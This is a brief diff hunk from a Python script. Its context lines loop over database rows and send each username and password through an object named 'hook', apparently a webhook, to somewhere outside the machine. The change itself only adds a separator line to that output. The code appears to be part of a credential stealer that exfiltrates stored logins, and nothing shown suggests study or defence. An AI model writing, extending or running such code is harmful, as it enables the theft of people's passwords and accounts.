@@ -60,6 +60,7 @@ def main():
             hook.send("---------------------------------")
             hook.send(f"Username: {username}")
             hook.send(f"Password: {password}")
+            hook.send("---------------------------------")
         else:
             continue
     cursor.close()
